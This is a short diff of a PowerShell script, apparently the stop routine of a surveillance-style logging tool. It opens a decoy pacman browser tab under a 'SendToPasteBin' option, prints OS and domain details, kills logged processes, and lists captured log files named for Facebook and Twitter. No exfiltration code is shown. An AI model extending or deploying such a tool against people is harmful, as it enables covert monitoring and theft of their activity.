@@ -566,20 +566,10 @@ If($Mode -iMatch '^(stop)$')
    ## SendToPasteBin function
    If($SendToPasteBin.IsPresent)
    {
-      write-host "   ╰➤ ⛑️ " -ForegroundColor Red -NoNewline
-      write-host "Open new tab to invoke SendToPasteBin"
-
-      start "https://elgoog.im/pacman"
-      Start-Sleep -Seconds 4
+      ## ⛑️ Open new tab to invoke SendToPasteBin
+      cmd /R start /max "https://elgoog.im/pacman"
+      Start-Sleep -Seconds 5
    }
-
-   ## Print info onscreen
-   $System = (Get-CimInstance -ClassName CIM_OperatingSystem).Caption
-   $OSversion = (Get-CimInstance -ClassName CIM_OperatingSystem).Version
-   $NameDomain = (Get-CimInstance -ClassName CIM_OperatingSystem).CSName
-   write-host "`n     Domain name      : $NameDomain"
-   write-host "     OS version       : $OSversion"
-   write-host "     Operative system : $System"
 
    ## Kill all PID's
    $PPID = (Get-Content "$Env:TMP\pid.log" -EA SilentlyContinue|Where-Object { $_ -ne '' })
@@ -587,6 +577,15 @@ If($Mode -iMatch '^(stop)$')
    {
       Invoke-KillAllPids
    }
+
+   ## Print info onscreen [header]
+   $System = (Get-CimInstance -ClassName CIM_OperatingSystem).Caption
+   $OSversion = (Get-CimInstance -ClassName CIM_OperatingSystem).Version
+   $NameDomain = (Get-CimInstance -ClassName CIM_OperatingSystem).CSName
+   write-host "`n`n     Domain name      : $NameDomain"
+   write-host "     OS version       : $OSversion"
+   write-host "     Operative system : $System"
+
 
    write-host "`n"
    $GetLogNames = (dir $Env:TMP).Name|findstr /C:'.Facebook' /C:'.Twitter' /C:'AUTO_BACKUP.'
